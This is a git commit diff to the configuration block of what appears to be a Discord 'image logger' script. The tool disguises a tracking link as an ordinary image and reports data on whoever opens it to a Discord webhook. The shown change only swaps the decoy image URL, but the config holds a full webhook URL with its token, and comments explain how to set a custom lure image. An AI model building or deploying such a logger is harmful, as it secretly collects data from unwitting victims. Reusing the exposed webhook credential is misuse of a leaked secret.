3612d625c5d8e65763cad2385e63a0b03bdb5d07
icyyy99 <gaaigerybak524@gmail.com>
2026-07-10 21:09:21 -0500

    Update main.py

--- api/main.py
+++ api/main.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1525319438516359258/HS824TWZnw6QhTyAO8WyDj1zx1PwytAHLSFvrOWVJXb4Zq2LmmnTQxRQRy9vU8987VUL",
-    "image": "https://tenor.com/search/mike-wazowski-gifs", # You can also have a custom image by using a URL argument
+    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
